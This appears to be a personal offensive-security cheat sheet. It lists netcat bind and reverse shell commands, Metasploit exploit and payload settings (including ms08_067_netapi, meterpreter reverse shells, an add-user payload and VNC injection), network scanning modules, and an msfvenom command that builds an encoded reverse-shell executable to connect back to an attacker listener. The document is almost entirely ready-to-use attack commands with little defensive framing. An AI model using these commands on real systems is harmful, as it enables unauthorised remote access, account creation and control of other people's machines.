## Netcat

Installed on all unix by default (macos, linux), default shell command lines.
Can be used like payload and execute a shell in last versions. (on MacOs, can't execute -e directly)

direct connection: when attacker connect and victim listen
reverse connection: when attacker listen and victim connect (not detected by firewalls - antivirus)

Kali:

	nc MACOS/Windows-IP 8888  -e /bin/bash (connect)
	nc  -lvvp 8888 -e /bin/bash (listen)
	
MacOS:

	nc KALI-IP 8888 (connect - cannot execute -e directly)
	nc -l 8888 (listen - cannot execute -e directly)

Windows:

	nc KALI-IP 8888 -e cmd.exe (connect)
	nc  -lvvp 8888 -e cmd.exe (listen)

## Metasploit

sudo msfdb init && msfconsole

Exploits:

	search exploit/osx

	use exploit/osx/...
	show info

	options
	set options value

	set payload [TAB] (payload compatible with exploit)
	set payload osx/meterpreter/reverse_tcp
	options
	show info (payload max space, rank)

	exploit (run exploit & active payload)

	use exploit/windows/smb/ms08_067_netapi (smb exploit)

	use exploit/multi/handler (listener)

## Payloads

Add user:

	set payload windows/adduser
	options
	show target (if don't autodetect)
	set target ...

## Meterpreter:

	set payload windows/meterpreter/bind_tcp (direct connection)
	set payload windows/meterpreter/reverse_tcp (reverse connection (bypass firewall))
	set payload windows/meterpreter/reverse_http (reverse connection - tunelize on http port)

## VncInject:

	set payload windows/vncinject/reverse_tcp (reverse connection -  remote access (visible on target screen))

## Shell:

	set payload windows/shell/reverse_tcp (reverse connection - light payload - shell (used to execute meterpreter))
	send shell on background

## Auxilary:

https://www.offensive-security.com/metasploit-unleashed/auxiliary-module-reference/

	use auxilary/scanner/discovery/arp_sweep (scanner ARP)
	show_info
	set rhosts 10.1.1.0/24
	run

	use auxilary/scanner/smb/pipe_auditor (check if smb is active to run exploit like netapi)

## Add modules to metasploit:

Terminal:

	mkdir /usr/share/metasploit-framework/modules/exploits/custom/
	cd /usr/share/metasploit-framework/modules/exploits/custom/
	wget https://gist.githubusercontent.com/todb-r7/5935519/raw/f18d6b0dcd94d135a567e5b50a9b1cab3a1c5e1b/test_module.rb  (module used for test => https://gist.github.com/todb-r7/5935519)
	
	can add new modules in each directories (exploits/custom, aucilary/custom, etc.) (custom modules have to be in ruby, .rb)
	
Metasploit:

	reload_all (on metasploit console to load new exploit or restart metasploit)
	use exploit/custom/test_module

# External Tools:

## Msfvenom:

Payload generation:

	msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=10.1.1.12 lport=4545 -e x86/shikata_ga_nai -b '\x00' -i 3 -f exe -o test.exe

	-a: x86/x64
	--platform: platform
	-p: payload
	-lhost: kali ip
	-lport: port
	-e: encoder
	-b: bad caracter to encode

## Metasploit:

	use exploit/multi/handler (listener)
	set payload windows/meterpreter/reverse_tcp
	set lhost 10.1.1.12
	set lport 4545 
	run

## Armitage:

GUI client for Metasploit, automated tools. (not complete like real metasploit)

Can be used for scaning (auxilary modules, nmap, etc...), detect OS and find vulnerabilities for this system, but is better to run the exploits from metasploit command lines.

	Attacks => Find attacks (find vulnerabilities for this system)
	Attacks => Hail Mary  (autopwn - run all compatible exploits - very agressive - should not be used)